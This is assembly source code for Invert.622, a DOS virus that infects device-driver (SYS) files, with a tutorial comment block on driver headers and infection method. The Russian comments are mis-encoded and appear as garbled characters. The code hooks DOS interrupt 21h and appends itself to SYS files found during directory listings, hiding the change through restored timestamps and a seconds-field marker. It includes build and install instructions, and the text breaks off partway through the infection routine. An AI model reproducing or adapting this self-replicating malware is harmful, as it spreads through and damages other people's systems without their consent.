   DEBUG = 0   ; 1 - ¢ª«îç¨âì ®â« ¤®çë© à¥¦¨¬
           ; 0 - ¢ëª«îç¨âì ®â« ¤®çë© à¥¦¨¬

   ; COMMENT %
   ;
   ;   Simple SYS virus. Infects DOS drivers by adding of new driver
   ;   to the end of file and correcting of header of SYS-file.
   ;
   ;    ‡¤®à®¢®,  à®¤. ‘¥£®¤ï ï å®çã à ááª § âì ®¡ ®¤®¬ â¨¯¥ ¨á¯®«ï¥¬ëå ä ©«®¢
   ; ¤«ï DOS, ® ª®â®à®¬ ¡®«ìè¥ ¨ªâ® à ááª §ë¢ âì ¥ å®ç¥â (ã¦ áª®«ìª® ï á¯à è¨¢ « -
   ; ¨ªâ® â ª ¨ ¥ áª § « ¬¥ ¨ç¥£® ¢à §ã¬¨â¥«ì®£®   íâã â¥¬). ˆâ ª, SYS ä ©«ë
   ; (¨«¨, ¨ ç¥, ¤à ©¢¥àë): çâ® ®¨ ¨§ á¥¡ï ¯à¥¤áâ ¢«ïîâ, ª ª £àã§ïâìáï ¢ ¯ ¬ïâì,
   ; ª ª ¢ë¯®«ïîâáï ¨ â.¯. ‘à §ã å®çã ¯à¥¤ã¯à¥¤¨âì, çâ® ¥ ¡ã¤ã à á¯à®áâà ïâìáï
   ;   â¥  á¯¥ªâë, ª®â®àë¥ ¥ ª á îâáï ¢¨àãá®¢ -   â® æ¥« ï ª¨£  ¯®«ãç¨âáï.
   ;    ‚á¥ ¤à ©¢¥àë ¤¥«ïâáï   á¨¬¢®«ìë¥ ¨ ¡«®çë¥. *à® ¡«®çë¥ ï ¨ç¥£® à ááª -
   ; §ë¢ âì ¥ ¡ã¤ã. ‚  ç «¥ SYS ä ©«  à á¯®«®¦¥ ¥¡®«ìè®© § £®«®¢®ª. ‚®â ¥£® ä®à-
   ; ¬ â:
   ;
   ;   +00h   1w   ‘¬¥é¥¨¥ á«¥¤ãîé¥£® § £®«®¢ª  (®â  ç «  ä ©« ). …á«¨ íâ® ¯®á«¥¤-
   ;               ¨© § £®«®¢®ª, â® §¤¥áì ¤®«¦® áâ®ïâì FFFF.
   ;   +02h   1w   ‘¥£¬¥â á«¥¤ãîé¥£® § £®«®¢ª . …á«¨ íâ® ¯®á«¥¤¨© § £®«®¢®ª, â®
   ;               §¤¥áì ¤®«¦® áâ®ïâì FFFF. …á«¨ ¥ ¯®á«¥¤¨©, â® 0000.
   ;   +04h   1w   €âà¨¡ãâë ¤à ©¢¥à . „«ï  è¨å æ¥«¥© §¤¥áì «ãçè¥ ¢á¥£® áâ ¢¨âì
   ;               8000h - á¨¬¢®«ìë© ¤à ©¢¥à ¥áâ ¤ àâ®£® ãáâà®©áâ¢ .
   ;   +06h   1w   ‘¬¥é¥¨¥ ¯à®æ¥¤ãàë áâà â¥£¨© (®â  ç «  ä ©« ).
   ;   +08h   1w   ‘¬¥é¥¨¥ ¯à®æ¥¤ãàë ¯à¥àë¢ ¨© (®â  ç «  ä ©« ).
   ;   +0Ah   8b   ˆ¬ï ¤à ©¢¥à  (¤«ï á¨¬¢®«ìëå ãáâà®©áâ¢).
   ;
   ;    Š ª ¢¨¤® ¨§ â ¡«¨æë, ¢ ®¤®¬ SYS ä ©«¥ ¬®¦¥â á®¤¥à¦ âìáï ¥áª®«ìª® ¤à ©-
   ; ¢¥à®¢. ‘ ç «  DOS ¨¨æ¨ «¨§¨àã¥â ¯¥à¢ë© ¤à ©¢¥à, § â¥¬ ¢â®à®© ¨ â.¤. ‚®â íâ®
   ; ¬ë ¨ ¡ã¤¥¬ ¨á¯®«ì§®¢ âì. —â®¡ë § à §¨âì SYS ä ©«, ã¦® á£¥¥à¨à®¢ âì á¢®©
   ; § £®«®¢®ª, ¤®¯¨á âì ¥£® ª ª®æã ä ©« , § â¥¬ âã¤  ¦¥ ¤®¯¨á âì á ¬ ¢¨àãá ¨ ¢
   ; ª®æ¥ ª®æ®¢ ¯¥à¢ë¥ 4 ¡ ©â  ä ©«  § ¬¥¨âì   ¤ «ì¨©  ¤à¥á  è¥£® § £®«®¢ª 
   ; (á¥£¬¥â ¡ã¤¥â à ¢¥ ã«î,   á¬¥é¥¨¥ - ¤«¨¥ ä ©« ). Š ª á£¥¥à¨à®¢ âì á¢®©
   ; § £®«®¢®ª? *¥à¢ë¥ ¤¢  ¯®«ï ¤®«¦ë á®¤¥à¦ âì â® ¦¥ § ç¥¨¥, çâ® ¨ ¯¥à¢ë¥ ¤¢ 
   ; ¯®«ï ¨áå®¤®£® ä ©« -¦¥àâ¢ë. €âà¨¡ãâë, ª ª ã¦¥ ¡ë«® áª § ®, ã¦® ¯®áâ ¢¨âì
   ; 8000h. ‘«¥¤ãîé¨¥ ¤¢  ¯®«ï ¯à¨©¤¥âáï ¢ëç¨á«¨âì, ¨áå®¤ï ¨§ ¤«¨ë § à ¦ ¥¬®£®
   ; ä ©« . ˆ¬ï ¤à ©¢¥à  ¬®¦® ¯®áâ ¢¨âì «î¡®¥. * §¬¥à à¥§ã«ìâ¨àãîé¥£® SYS ä ©«  ¥
   ; ¤®«¦¥ ¯à¥¢ëè âì 64Kb.
   ;    SYS ä ©« £àã§¨âáï ¢ ¯ ¬ïâì ¯®«®áâìî, ¢¬¥áâ¥ á § £®«®¢ª®¬. „«ï SYS ä ©«®¢
   ; ¨ª®£¤  ¥ á®§¤ ¥âáï PSP. *à¨ § £àã§ª¥ ¤à ©¢¥à®¢ ¢ ¯ ¬ïâì DOS ¨§¬¥ï¥â ¯¥à¢ë¥
   ; ¤¢  ¯®«ï ¨å § £®«®¢ª®¢: áâ ¢¨â â ¬ ¤ «ì¨© ãª § â¥«ì   á«¥¤ãîé¨© ¤à ©¢¥à -
   ; ¢ëáâà ¨¢ ¥â ¨å ¢ æ¥¯®çªã (¤«ï á¢®¨å æ¥«¥©). *®á«¥ íâ®£® ¤à ©¢¥àë áâ ®¢ïâáï
   ; ç áâìî ®¯¥à æ¨®®© á¨áâ¥¬ë.
   ;    *à¨ § £àã§ª¥ ¤à ©¢¥à  DOS á ç «  ¯¥à¥¤ ¥â ã¯à ¢«¥¨¥ ¯à®æ¥¤ãà¥ áâà â¥£¨©.
   ; …¤¨áâ¢¥®¥, çâ® ¥© ã¦® á¤¥« âì - íâ® á®åà ¨âì £¤¥-¨¡ã¤ì ¢  ¤¥¦®¬ ¬¥áâ¥
   ; à¥£¨áâàë ES:BX. ‚ íâ¨å à¥£¨áâà å åà ¨âáï  ¤à¥á § ¯à®á , ª®â®àë© ä®à¬¨àã¥â DOS
   ; ¤«ï ®¡à é¥¨ï ª ¤à ©¢¥àã, ® ®¡ íâ®¬ ¨¦¥.
   ;    ‡ â¥¬ ã¯à ¢«¥¨¥ ¯®«ãç ¥â ¯à®æ¥¤ãà  ¯à¥àë¢ ¨©. ‡ ¬¥çã, çâ® íâ  ¯à®æ¥¤ãà  ¥
   ; ¨¬¥¥â ¨ç¥£® ®¡é¥£® á ¯à®æ¥¤ãà®© ®¡à ¡®âª¨ ¯à¥àë¢ ¨© - ¯à®áâ® ã ¥¥  §¢ ¨¥
   ; â ª®¥. ‚ ¯¥à¢ãî ®ç¥à¥¤ì  ¤® à §ëª âì á®åà ¥ë¥ ES:BX. ‚ § ¯à®á¥  å®¤¨âáï
   ; ®¬¥à ª®¬ ¤ë, ª®â®àãî ¤®«¦¥ ¢ë¯®«¨âì ¤à ©¢¥à (¤«ï  á ¢ ¦  â®«ìª® ª®¬ ¤ 
   ; ¨¨æ¨ «¨§ æ¨¨), ¨ ¯®«ï, ¢ ª®â®àë¥ ã¦® § ¯¨á âì à¥§ã«ìâ â ¢ë¯®«¥¨ï íâ®© ª®-
   ; ¬ ¤ . …á«¨ ã  á ¢  âà¨¡ãâ å áâ®¨â 8000h (á¬. ¢ëè¥), â® ¯à®æ¥¤ãà  ¯à¥àë¢ ¨©
   ; ¯®«ãç¨â ã¯à ¢«¥¨¥ â®«ìª® ®¤¨ à § - ¢ ¬®¬¥â § £àã§ª¨ ¤à ©¢¥à  ¢ ¯ ¬ïâì. ‚®â
   ; ä®à¬ â § ¯à®á , ª®â®àë© áä®à¬¨àã¥â DOS ¤«ï íâ®£® á«ãç ï (§¢¥§¤®çª®© ¯®¬¥ç¥ë
   ; ¯®«ï, ª®â®àë¥ ¡ã¤ãâ  á ¨â¥à¥á®¢ âì):
   ;
   ;   ES:[BX+00h]   1b   „«¨  § ¯à®á .
   ;   ES:[BX+01h]   1b   *®¬¥à ãáâà®©áâ¢  (¤«ï ¡«®çëå ãáâà®©áâ¢).
   ; * ES:[BX+02h]   1b   Š®¬ ¤ , ª®â®àãî ã¦® ¢ë¯®«¨âì. Š®¬ ¤  ¨¨æ¨ «¨§ æ¨¨
   ;                      ¨¬¥¥â ª®¤ 0. ”®à¬ â § ¯à®á , ¯à¨¢¥¤¥®£® §¤¥áì, ¨¬¥®
   ;                      ¤«ï íâ®© ª®¬ ¤ë.
   ; * ES:[BX+03h]   1w   ‘«®¢® á®áâ®ï¨ï. ‘î¤  ¬ë ¤®«¦ë § ¯¨á âì à¥§ã«ìâ â ¢ë¯®«-
   ;                      ¥¨ï ª®¬ ¤ë (á¬. ¤ «ìè¥)
   ;   ES:[BX+05h]   8b   ‡ à¥§¥à¢¨à®¢ ®.
   ;   ES:[BX+0Dh]   1b   Š®«-¢® ®¡á«ã¦¨¢ ¥¬ëå ãáâà®©áâ¢ (¤«ï ¡«®çëå ¤à ©¢¥à®¢).
   ; * ES:[BX+0Eh]   2w   ‡¤¥áì ã¦® ãª § âì ¤ «ì¨©  ¤à¥á ª®æ  â®£® ª®¤ , ª®â®àë©
   ;                      ¬ë å®â¨¬ ®áâ ¢¨âì à¥§¨¤¥âë¬ (á¬. ¤ «ìè¥).
   ;   ES:[BX+12h]   2w   „ «ì¨©  ¤à¥á áâà®ª¨ ¯ à ¬¥âà®¢ (¢á¥, çâ® á«¥¤ã¥â § 
   ;                      áâà®ª®© "DEVICE=" ¨§ CONFIG.SYS).
   ;   ES:[BX+16h]   1b   *®¬¥à ãáâà®©áâ¢ , ®¡á«ã¦¨¢ ¥¬®£® ¤à ©¢¥à®¬ ( § ç ¥âáï
   ;                      DOS-®¬).
   ;
   ; ”®à¬ â á«®¢  á®áâ®ï¨ï:
   ;
   ; *   0-7  Š®¤ ®è¨¡ª¨. *â® ¯®«¥ ¤¥©áâ¢¨â¥«ì®, ¥á«¨ ãáâ ®¢«¥ ¡¨â 15.
   ; *     8  Š®¬ ¤  ¢ë¯®«¥ . *â®â ¡¨â ã¦® ãáâ  ¢«¨¢ âì ¯¥à¥¤ ¢®§¢à â®¬
   ;          ã¯à ¢«¥¨ï DOS-ã.
   ;       9  “áâà®©áâ¢® § ïâ®.
   ;   10-14  ‡ à¥§¥à¢¨à®¢ ®.
   ; *    15  *à¨§ ª ®è¨¡ª¨.
   ;
   ; ‚®§¬®¦ë¥ ª®¤ë ®è¨¡®ª:
   ;
   ;   00h   ¯®¯ëâª  § ¯¨á¨   § é¨é¥®¥ ãáâà®©áâ¢®.
   ;   01h   ¥¨§¢¥áâ®¥ ãáâà®©áâ¢®.
   ;   02h   ãáâà®©áâ¢® ¥ £®â®¢®.
   ; * 03h   ¥¨§¢¥áâ ï ª®¬ ¤ .
   ;   04h   CRC error.
   ;   05h   ¥¯à ¢¨«ì ï ¤«¨  § ¯à®á .
   ;   06h   ¤®à®¦ª  ¥  ©¤¥ .
   ;   07h   ¥¨§¢¥áâë© ®á¨â¥«ì ¤ ëå.
   ;   08h   á¥ªâ®à ¥  ©¤¥.
   ;   09h   ¥â ¡ã¬ £¨ ¢ ¯à¨â¥à¥.
   ;   0Ah   ®è¨¡ª  § ¯¨á¨.
   ;   0Bh   ®è¨¡ª  çâ¥¨ï.
   ;   0Ch   ®¡é ï ®è¨¡ª .
   ;   0Dh   § à¥§¥à¢¨à®¢ ®.
   ;   0Eh   § à¥§¥à¢¨à®¢ ®.
   ;   0Fh   ¥à §à¥è¥ ï § ¬¥  ¤¨áª .
   ;
   ;    ˆâ ª, ¬ë (¯à®æ¥¤ãà  ¯à¥àë¢ ¨©) ¯®«ãç¨«¨ ã¯à ¢«¥¨¥. ‚ ¯¥à¢ãî ®ç¥à¥¤ì ã¦®
   ; ¯à®¢¥à¨âì, ª ªãî ª®¬ ¤ã âà¥¡ã¥âáï ¢ë¯®«¨âì. …á«¨ íâ® *… ª®¬ ¤  ¨¨æ¨ «¨§ -
   ; æ¨¨, â® ãáâ  ¢«¨¢ ¥¬ á«®¢® á®áâ®ï¨ï ¢ 8103h (¥¨§¢¥áâ ï ª®¬ ¤ ) ¨ ¢ëå®¤¨¬.
   ; ’¥¯¥àì ¢ë¤¥«ï¥¬ ¯ ¬ïâì. „«ï íâ®£® ¢ ïç¥©ªã ES:[BX+0Eh] ã¦® § ¥áâ¨ á¬¥é¥¨¥
   ; ¯®á«¥¤¥£® ¡ ©â  ¢¨àãá  + 1,   ¢ ïç¥©ªã ES:[BX+10h] - § ç¥¨¥ CS. ‡ â¥¬ ã¦®
   ; ¯à®¢¥à¨âì, ¥ ¯à¨áãâáâ¢ã¥â «¨ ¢ ¯ ¬ïâ¨ ¤àã£ ï ª®¯¨ï ¢¨àãá . …á«¨ ¥â, â® ¯¥à¥-
   ; å¢ â¨âì Int 21h (¨«¨ ¥é¥ çâ®-¨¡ã¤ì). *ã   ¥á«¨ ¯à¨áãâáâ¢ã¥â? „ ¦¥ ¢ íâ®¬ á«ã-
   ; ç ¥ ¯ ¬ïâì ¢á¥ à ¢® ¯à¨©¤¥âáï ¢ë¤¥«ïâì (¯®íâ®¬ã ¬ë ¨ á¤¥« «¨ íâ® „Ž ¯à®¢¥àª¨
   ; ¯à¨áãâáâ¢¨ï ¤àã£®© ª®¯¨¨ ¢ ¯ ¬ïâ¨) - ¨ ¢ íâ®¬ á®áâ®¨â ®¤¨ ¨§ £«îª®¢ â ª®£®
   ; ¬¥â®¤  § à ¦¥¨ï SYS ä ©«®¢. *ã, ¤®¯ãáâ¨¬, ¬ë á¤¥« «¨ ¢á¥ ¢ëè¥®¯¨á ®¥ ¨ ¯¥à¥-
   ; å¢ â¨«¨ ã¦ë¥  ¬ ¯à¥àë¢ ¨ï. ’¥¯¥àì ®áâ ¥âáï â®«ìª® ãáâ ®¢¨âì á«®¢® á®áâ®-
   ; ï¨ï ¢ 100h (ã¤ ç®¥ § ¢¥àè¥¨¥) ¨ ®â¤ âì ã¯à ¢«¥¨¥ DOS-ã.
   ;    ‚®â, ¯®¦ «ã©, ¨ ¢á¥. *à ¢¤ , ã â ª®£® ¬¥â®¤  § à ¦¥¨ï ¥áâì ¥é¥ ®¤¨ £«îª:
   ; ¯à¥¦¤¥ ç¥¬ ¬ë ¯®«ãç¨¬ ã¯à ¢«¥¨¥, ¯à®¨§®©¤¥â ¨¨æ¨ «¨§ æ¨ï ¤à ©¢¥à , ª®â®àë©
   ; áâ®¨â à ìè¥  á (¢  ç «¥ ä ©« ). …á«¨ íâ®â ¤à ©¢¥à § ¯¨è¥â çâ®-¨¡ã¤ì ¢ ®¡-
   ; « áâì ª®¤  ¢¨àãá , â® ¯®á«¥¤áâ¢¨ï ¡ã¤ãâ ¥ á ¬ë¥ «ãçè¨¥. Š áç áâìî â ª ¤¥« îâ
   ; «¨èì ¥¬®£¨¥ ¤à ©¢¥àë, ¯®íâ®¬ã   íâ® ¬®¦® § ¡¨âì, å®âï ¡®à®âìáï á íâ¨¬ ¨ª ª
   ; ¥«ì§ï.
   ;    ‘¯à ¢¥¤«¨¢®áâ¨ à ¤¨ áª ¦ã, çâ® ¥áâì ¥é¥ ®¤¨ ¬¥â®¤ § à ¦¥¨ï SYS ä ©«®¢.
   ; *ã¦® ¯¥à¥áâ ¢¨âì   á¥¡ï  ¤à¥á ¯à®æ¥¤ãàë áâà â¥£¨© (¨«¨ ¯à¥àë¢ ¨©) á ¬®£®
   ; ¯¥à¢®£® ¤à ©¢¥à  ¢ ä ©«¥. *à¨ ¯®«ãç¥¨¨ ã¯à ¢«¥¨ï ¯¥à¥£ âì á¥¡ï,  ¯à¨¬¥à,
   ; ¢ ¢¨¤¥®¯ ¬ïâì (MCB ¯®ª  ¯®«ì§®¢ âìáï ¥«ì§ï), ¯®¤®¦¤ âì § £àã§ª¨ á¨áâ¥¬ë,  
   ; § â¥¬ ã¦¥ à §¬¥áâ¨âì á¥¡ï ¢ ¯ ¬ïâ¨ ¯®-®à¬ «ì®¬ã. —â® ¦¥ ª á ¥âáï ¯¥à¢®£® ¬¥-
   ; â®¤  - ® å®âì ¨ £«îçë©, § â® ¡®«¥¥ ¨â¥à¥áë© á â®çª¨ §à¥¨ï ¨§ãç¥¨ï ¢®§-
   ; ¬®¦®áâ¥© DOS- . „«ï «ãçè¥£® ¥£® ¯®¨¬ ¨ï ¯à¥¤« £ î ¯®á¬®âà¥âì ¨¦¥á«¥¤ãîé¨©
   ; ¢¨àãá. ‚®â ¥£® ¥¡®«ìè®¥ ®¯¨á ¨¥:
   ;    ‚¨àãá § à ¦ ¥â SYS ä ©«ë ¯à¨ çâ¥¨¨ ª â «®£®¢, ¤ ¯¨áë¢ ïáì ¢ ¨å ª®¥æ ¢
   ; ª ç¥áâ¢¥ ®¢®£® ¤à ©¢¥à . *à®¢¥àª  â¨¯  ä ©«  ¯à®¨áå®¤¨â ª ª ¯® à áè¨à¥¨î, â ª
   ; ¨ ¯® ¯¥à¢ë¬ ç¥âëà¥¬ ¡ ©â ¬. Š®àà¥ªâ® § à ¦ ¥â SYS ä ©«ë ¤«ï Windows - ENUNS,
   ; RUSNS ¨ â.¯. *à¨§ ª § à ¦¥®áâ¨ ä ©«  - 62 á¥ªã¤ë ¢ ¯®«¥ ¢à¥¬¥¨ á®§¤ ¨ï.
   ; Ž¡à ¡ âë¢ ¥â ä ©«ë á  âà¨¡ãâ®¬ "Read Only". *¥ ¨§¬¥ï¥â  âà¨¡ãâë ä ©«  ¨ ¢à¥¬ï
   ; ¥£® á®§¤ ¨ï (§  ¨áª«îç¥¨¥¬ á¥ªã¤). *¥ £«îç¨â   § é¨é¥ëå ®â § ¯¨á¨ ¤¨áª¥-
   ; â å. …áâì ®â« ¤®çë© à¥¦¨¬, ¯à¨ ª®â®à®¬ ¢¨àãá § à ¦ ¥â â®«ìª® ä ©«ë á à áè¨à¥-
   ; ¨¥¬ ZZZ. 18 ¬ ï ¯à¨ § à ¦¥¨¨ ª ¦¤®£® ä ©«  ¢¨àãá ¯¥à¥¢®à ç¨¢ ¥â ¢á¥ ¡ãª¢ë
   ; ªà®¬¥ ¯á¥¢¤®£à ä¨ª¨, §  çâ® ¨ ¯®«ãç¨« á¢®¥  §¢ ¨¥ (Invert.622). ‡ ¬¥ç¥ë¥
   ; £«îª¨:
   ;
   ;    1. *®á«¥ § £àã§ª¨ Windows ¢¨àãá ¯¥à¥áâ ¥â äãªæ¨®¨à®¢ âì. *¨ç¥£® ã¤¨¢¨-
   ;       â¥«ì®£® ¢ íâ®¬ ¥â - ®â Windows ¢á¥£® ¬®¦® ®¦¨¤ âì.
   ;    2. …á«¨ ¢ ®¡à ¡®âç¨ª¥ Int 21h ¥ á®åà ïâì ä« £¨ (å®âï ®¨ ¨ â ª ¤®«¦ë
   ;       á®åà ïâìáï ª®¬ ¤®© INT), â® ¬®£ãâ ¯à®£«îç¨âì ¥ª®â®àë¥ ¯à®£à ¬¬ë, § -
   ;       ¯ãáª ¥¬ë¥ ¨§ AUTOEXEC.BAT. ‚®§¬®¦®, íâ® á¢ï§ ® á â¥¬, çâ® ã ¬¥ï ãáâ -
   ;       ®¢«¥ EMM386, ª®â®àë© £àã§¨â ª®¬¯ìîâ¥à ¢ V86,   ¯à¥àë¢ ¨ï ®¡à ¡®âë¢ ¥â
   ;       á ç «  á ¬.
   ;
   ; „«ï ãáâ ®¢ª¨ ¢¨àãá  ¢ á¨áâ¥¬ã áª®¯¨àã©â¥ INVERT.SYS,  ¯à¨¬¥à, ¢ ª®à¥¢®©
   ; ª â «®£ ¨ ¤®¡ ¢ìâ¥ ¢ CONFIG.SYS áâà®ªã "DEVICE=C:\INVERT.SYS".
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 18.05.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;           Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;              tasm /m invert.asm
   ;              tlink /x invert.obj
   ;              exe2bin invert.exe invert.sys
   ;              del invert.obj
   ;              del invert.exe
   ;
   ;
   ;           ” ©«ë ¨§  àå¨¢ :
   ;
   ;              invert.asm  15800 (¨áå®¤¨ª ¢¨àãá )
   ;              invert.sys    622 (¡¨ à¨ª ¢¨àãá )
   ; %









   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment
           assume  cs:Code, ds:Code
           org 0

   Start:      dd  -1
           dw  8000h
           dw  offset Strategy
           dw  offset Interrupt
           db  'XXXXXX$$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Strategy:   push    si
           call    StrEntry
   StrEntry:   pop si
           mov cs:[Pointer+si-StrEntry], bx
           mov cs:[Pointer+2+si-StrEntry], es
           pop si
           retf

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Interrupt:  pusha
           push    ds
           push    es

           call    IntEntry
   IntEntry:   pop si


   ;[*â® ¨¨æ¨ «¨§ æ¨ï ¤à ©¢¥à ?]

           lds bx, cs:[Pointer-IntEntry+si]
           mov ds:[bx+03h], 8103h
           cmp ds:[bx+02h], byte ptr 0
           jne Exit


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

           mov ds:[bx+03h], 0100h
           lea ax, [EndVir-IntEntry+si]
           mov ds:[bx+0Eh], ax
           mov ds:[bx+10h], cs


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           mov ax, 0ABCDh
           int 21h
           cmp ax, 0CDABh
           je  Exit


   ;[*¥à¥ãáâ  ¢«¨¢ ¥¬ Int 21h   Int 65h]

           mov ax, 3521h
           int 21h
           mov ax, 2565h
           mov dx, bx
           push    es
           pop ds
           int 21h


   ;[“áâ  ¢«¨¢ ¥¬ ¢¨àãá   Int 21h]

           mov ax, 2521h
           lea dx, [Int21h-IntEntry+si]
           push    cs
           pop ds
           int 21h


   Exit:       pop es
           pop ds
           popa
           retf

   VirName     db  'Invert.622 -- Copyright (c) by DJ Sadovnikov'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int24h:     mov al, 3
           iret


   Int21h:     pushf
           cmp ax, 0ABCDh
           jne NotTest
           xchg    ah, al
           popf
           iret


   NotTest:    cmp ah, 4Eh
           je  DirSearch
           cmp ah, 4Fh
           je  DirSearch

           popf
           int 65h
           jc  QuitSTC

   QuitCLC:    push    bp
           mov bp, sp
           and [bp+6], byte ptr 11111110b
           pop bp
           iret

   QuitSTC:    push    bp
           mov bp, sp
           or  [bp+6], byte ptr 00000001b
           pop bp
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   DirSearch:  popf
           int 65h
           jc  QuitSTC

           pushf
           pusha
           push    ds
           push    es


   ;[‚ëç¨á«ï¥¬ â®çªã ¢å®¤ ]

           call    Entry
   Entry:      pop si


   ;[‘®åà ï¥¬  ¤à¥á ®¡à ¡®âç¨ª  Int 24h]

           mov ax, 3524h
           int 65h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           mov ax, 2524h
           lea dx, [Int24h-Entry+si]
           push    cs
           pop ds
           int 65h


   ;[*®«ãç ¥¬  ¤à¥á DTA]

           mov ah, 2Fh
           int 65h
           jc  Quit
           push    es
           pop ds


   ;[* ©¤¥ ª â «®£ ¨«¨ ¬¥âª  â®¬ ?]

           test    ds:[bx+15h], byte ptr 00011000b
           jnz Quit


   ;[*à®¢¥àï¥¬ ä ©«   § à ¦¥®áâì]

           mov al, ds:[bx+16h]
           or  al, 11100000b
           inc al
           jz  Quit


   ;[ˆé¥¬ ª®¥æ ¨¬¥¨ ä ©« ]

           add bx, 1Eh
           mov dx, bx
   FindZero:   inc bx
           cmp ds:[bx], byte ptr 0
           jne FindZero


   ;[*â® SYS-ä ©«?]

           mov ax, ds:[bx-4]
           and ah, 0DFh
   IF DEBUG
           cmp ax, 'Z.'
   ELSE
           cmp ax, 'S.'
   ENDIF
           jne Quit
           mov ax, ds:[bx-2]
           and ax, 0DFDFh
   IF DEBUG
           cmp ax, 'ZZ'
   ELSE
           cmp ax, 'SY'
   ENDIF
           jne Quit


   ;[‡ à ¦ ¥¬ ä ©«]

           call    Infect


   ;[‚®ááâ  ¢«¨¢ ¥¬ áâ àë© ®¡à ¡®âç¨ª Int 24h]

   Quit:       mov ax, 2524h
           pop dx
           pop ds
           int 65h

           pop es
           pop ds
           popa
           popf
           jmp QuitCLC


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

   Infect:     mov ax, 4300h
           int 65h
           jc  Return
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 65h
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 65h
           jc  RestAttr
           xchg    ax, bx
           push    cs
           pop ds


   ;[‘®åà ï¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 65h
           jc  Close
           push    cx
           push    dx


   ;[‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ 4 ¡ ©â  § £®«®¢ª ]

           mov ah, 3Fh
           mov cx, 4
           lea dx, [Header-Entry+si]
           int 65h
           jc  RestTime


   ;[*à®¢¥àï¥¬ â¨¯ ä ©« ]

           cmp [Header-Entry+si], 'ZM'
           je  RestTime
           cmp [Header-Entry+si], 0FFFFh
           je  DriverOk
           cmp [Header+2-Entry+si], word ptr 0
           je  DriverOk

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop dx
           pop cx
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov ah, 3Eh
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 65h

   Return:     ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   7 ¯®§¨æ¨© ®â ª®æ  ä ©« ]

   DriverOk:   mov ax, 4202h
           mov cx, 0FFFFh
           mov dx, 0FFF9h
           int 65h
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ 7 ¡ ©â]

           mov ah, 3Fh
           mov cx, 7
           lea dx, [XXXNS-Entry+si]
           int 65h
           jc  RestTime


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢ ª®¥æ ä ©« ]

           mov ax, 4202h
           xor cx, cx
           xor dx, dx
           int 65h
           jc  RestTime


